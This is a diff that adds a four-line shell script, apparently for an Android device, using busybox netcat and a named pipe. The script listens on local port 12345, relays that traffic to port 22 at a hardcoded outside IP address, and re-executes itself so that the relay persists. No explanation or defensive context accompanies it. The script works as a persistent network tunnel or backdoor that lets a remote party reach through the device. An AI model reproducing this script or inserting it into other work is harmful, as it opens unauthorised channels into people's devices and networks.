@@ -1,0 +1,4 @@
+rm /data/local/tmp/backpipe
+/data/local/bin/busybox mkfifo /data/local/tmp/backpipe
+/data/local/bin/busybox nc -l -p 12345 0</data/local/tmp/backpipe |/data/local/bin/busybox nc 136.248.126.163 22 1>/data/local/tmp/backpipe
+exec $0
